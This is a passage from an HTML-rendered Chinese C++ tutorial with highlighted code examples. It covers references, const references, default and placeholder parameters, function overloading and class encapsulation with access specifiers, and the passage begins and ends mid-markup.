class="line"></span><br><span class="line">mySwap01(a, b);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">mySwap02(&amp;a, &amp;b);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">mySwap03(a, b);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：通过引用参数产生的效果同按地址传递是一样的。引用的语法更清楚简单</p></blockquote><h3 id="2-4-引用做函数返回值">2.4 引用做函数返回值</h3><p>作用：引用是可以作为函数的返回值存在的</p><p>注意：<strong>不要返回局部变量引用</strong></p><p>用法：函数调用作为左值</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回局部变量引用</span></span><br><span class="line"><span class="type">int</span>&amp; <span class="title function_">test01</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>; <span class="comment">//局部变量</span></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回静态变量引用</span></span><br><span class="line"><span class="type">int</span>&amp; <span class="title function_">test02</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> a = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不能返回局部变量的引用</span></span><br><span class="line"><span class="type">int</span>&amp; ref = test01();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果函数做左值，那么必须返回引用</span></span><br><span class="line"><span class="type">int</span>&amp; ref2 = test02();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">test02() = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-引用的本质">2.5 引用的本质</h3><p>本质：<strong>引用的本质在 c++内部实现是一个指针常量.</strong></p><p>讲解示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//发现是引用，转换为 int* const ref = &amp;a;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>&amp; ref)</span>&#123;</span><br><span class="line">ref = <span class="number">100</span>; <span class="comment">// ref是引用，转换为*ref = 100</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//自动转换为 int* const ref = &amp;a; 指针常量是指针指向不可改，也说明为什么引用不可更改</span></span><br><span class="line"><span class="type">int</span>&amp; ref = a;</span><br><span class="line">ref = <span class="number">20</span>; <span class="comment">//内部发现ref是引用，自动帮我们转换为: *ref = 20;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ref:&quot;</span> &lt;&lt; ref &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">func(a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结论：C++推荐用引用技术，因为语法方便，引用本质是指针常量，但是所有的指针操作编译器都帮我们做了</p><h3 id="2-6-常量引用">2.6 常量引用</h3><p>**作用：**常量引用主要用来修饰形参，防止误操作</p><p>在函数形参列表中，可以加 const 修饰形参，防止形参改变实参</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用使用的场景，通常用来修饰形参</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">showValue</span><span class="params">(<span class="type">const</span> <span class="type">int</span>&amp; v)</span> &#123;</span><br><span class="line"><span class="comment">//v += 10;</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; v &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//int&amp; ref = 10;  引用本身需要一个合法的内存空间，因此这行错误</span></span><br><span class="line"><span class="comment">//加入const就可以了，编译器优化代码，int temp = 10; const int&amp; ref = temp;</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span>&amp; ref = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ref = 100;  //加入const后不可以修改变量</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ref &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数中利用常量引用防止误操作修改实参</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">showValue(a);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-函数提高">3 函数提高</h2><h3 id="3-1-函数默认参数">3.1 函数默认参数</h3><p>在 C++中，函数的形参列表中的形参是可以有默认值的。</p><p>语法：<code>返回值类型 函数名 （参数= 默认值）&#123;&#125;</code></p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>, <span class="type">int</span> c = <span class="number">10</span>)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 如果某个位置参数有默认值，那么从这个位置往后，从左向右，必须都要有默认值</span></span><br><span class="line"><span class="comment">//2. 如果函数声明有默认值，函数实现的时候就不能有默认参数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> a = <span class="number">10</span>, <span class="type">int</span> b = <span class="number">10</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; func(<span class="number">20</span>, <span class="number">20</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; func(<span class="number">100</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-函数占位参数">3.2 函数占位参数</h3><p>C++中函数的形参列表里可以有占位参数，用来做占位，调用函数时必须填补该位置</p><p><strong>语法：</strong> <code>返回值类型 函数名 (数据类型)&#123;&#125;</code></p><p>在现阶段函数的占位参数存在意义不大，但是后面的课程中会用到该技术</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数占位参数 ，占位参数也可以有默认参数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span>)</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;this is func&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">func(<span class="number">10</span>,<span class="number">10</span>); <span class="comment">//占位参数必须填补</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-函数重载">3.3 函数重载</h3><h4 id="3-3-1-函数重载概述">3.3.1 函数重载概述</h4><p>**作用：**函数名可以相同，提高复用性</p><p><strong>函数重载满足条件：</strong></p><ul><li>同一个作用域下</li><li>函数名称相同</li><li>函数参数<strong>类型不同</strong>   或者 <strong>个数不同</strong> 或者 <strong>顺序不同</strong></li></ul><p><strong>注意:</strong>   函数的返回值不可以作为函数重载的条件</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数重载需要函数都在同一个作用域下</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func 的调用！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func (int a) 的调用！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">double</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func (double a)的调用！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a ,<span class="type">double</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func (int a ,double b) 的调用！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">double</span> a ,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func (double a ,int b)的调用！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数返回值不可以作为函数重载条件</span></span><br><span class="line"><span class="comment">//int func(double a, int b)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;func (double a ,int b)的调用！&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">func();</span><br><span class="line">func(<span class="number">10</span>);</span><br><span class="line">func(<span class="number">3.14</span>);</span><br><span class="line">func(<span class="number">10</span>,<span class="number">3.14</span>);</span><br><span class="line">func(<span class="number">3.14</span> , <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-3-2-函数重载注意事项">3.3.2 函数重载注意事项</h4><ul><li>引用作为重载条件</li><li>函数重载碰到函数默认参数</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数重载注意事项</span></span><br><span class="line"><span class="comment">//1、引用作为重载条件</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> &amp;a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func (int &amp;a) 调用 &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func (const int &amp;a) 调用 &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、函数重载碰到函数默认参数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func2(int a, int b = 10) 调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func2(int a) 调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">func(a); <span class="comment">//调用无const</span></span><br><span class="line">func(<span class="number">10</span>);<span class="comment">//调用有const</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//func2(10); //碰到默认参数产生歧义，需要避免</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-类和对象"><strong>4</strong> 类和对象</h2><p>C++面向对象的三大特性为：封装、继承、多态</p><p>C++认为万事万物都皆为对象，对象上有其属性和行为</p><p><strong>例如：</strong></p><pre><code>人可以作为对象，属性有姓名、年龄、身高、体重...，行为有走、跑、跳、吃饭、唱歌...车也可以作为对象，属性有轮胎、方向盘、车灯...,行为有载人、放音乐、放空调...具有相同性质的对象，我们可以抽象称为类，人属于人类，车属于车类</code></pre><h3 id="4-1-封装">4.1 封装</h3><h4 id="4-1-1-封装的意义">4.1.1   封装的意义</h4><p>封装是 C++面向对象三大特性之一</p><p>封装的意义：</p><ul><li>将属性和行为作为一个整体，表现生活中的事物</li><li>将属性和行为加以权限控制</li></ul><p><strong>封装意义一：</strong></p><pre><code>在设计类的时候，属性和行为写在一起，表现事物</code></pre><p><strong>语法：</strong> <code>class 类名&#123; 访问权限： 属性 / 行为 &#125;;</code></p><p>**示例 1：**设计一个圆类，求圆的周长</p><p><strong>示例代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//圆周率</span></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI = <span class="number">3.14</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、封装的意义</span></span><br><span class="line"><span class="comment">//将属性和行为作为一个整体，用来表现生活中的事物</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//封装一个圆类，求圆的周长</span></span><br><span class="line"><span class="comment">//class代表设计一个类，后面跟着的是类名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:  <span class="comment">//访问权限  公共的权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//属性</span></span><br><span class="line"><span class="type">int</span> m_r;<span class="comment">//半径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//行为</span></span><br><span class="line"><span class="comment">//获取到圆的周长</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">calculateZC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//2 * pi  * r</span></span><br><span class="line"><span class="comment">//获取圆的周长</span></span><br><span class="line"><span class="keyword">return</span>  <span class="number">2</span> * PI * m_r;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过圆类，创建圆的对象</span></span><br><span class="line"><span class="comment">// c1就是一个具体的圆</span></span><br><span class="line">Circle c1;</span><br><span class="line">c1.m_r = <span class="number">10</span>; <span class="comment">//给圆对象的半径 进行赋值操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2 * pi * 10 = = 62.8</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;圆的周长为： &quot;</span> &lt;&lt; c1.calculateZC() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**示例 2：**设计一个学生类，属性有姓名和学号，可以给姓名和学号赋值，可以显示学生的姓名和学号</p><p><strong>示例 2 代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">setName</span><span class="params">(<span class="built_in">string</span> name)</span> &#123;</span><br><span class="line">m_name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setID</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">m_id = id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showStudent</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;name:&quot;</span> &lt;&lt; m_name &lt;&lt; <span class="string">&quot; ID:&quot;</span> &lt;&lt; m_id &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="built_in">string</span> m_name;</span><br><span class="line"><span class="type">int</span> m_id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">Student stu;</span><br><span class="line">stu.setName(<span class="string">&quot;德玛西亚&quot;</span>);</span><br><span class="line">stu.setID(<span class="number">250</span>);</span><br><span class="line">stu.showStudent();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>封装意义二：</strong></p><p>类在设计时，可以把属性和行为放在不同的权限下，加以控制</p><p>访问权限有三种：</p><ol><li>public         公共权限</li><li>protected 保护权限</li><li>private       私有权限</li></ol><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三种权限</span></span><br><span class="line"><span class="comment">//公共权限  public     类内可以访问  类外可以访问</span></span><br><span class="line"><span class="comment">//保护权限  protected  类内可以访问  类外不可以访问</span></span><br><span class="line"><span class="comment">//私有权限  private    类内可以访问  类外不可以访问</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//姓名  公共权限</span></span><br><span class="line">public:</span><br><span class="line"><span class="built_in">string</span> m_Name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//汽车  保护权限</span></span><br><span class="line">protected:</span><br><span class="line"><span class="built_in">string</span> m_Car;</span><br><span class="line"></span><br><span class="line"><span class="comment">//银行卡密码  私有权限</span></span><br><span class="line">private:</span><br><span class="line"><span class="type">int</span> m_Password;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">m_Name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">m_Car = <span class="string">&quot;拖拉机&quot;</span>;</span><br><span class="line">m_Password = <span class="number">123456</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">Person p;</span><br><span class="line">p.m_Name = <span class="string">&quot;李四&quot;</span>;</span><br><span class="line"><span 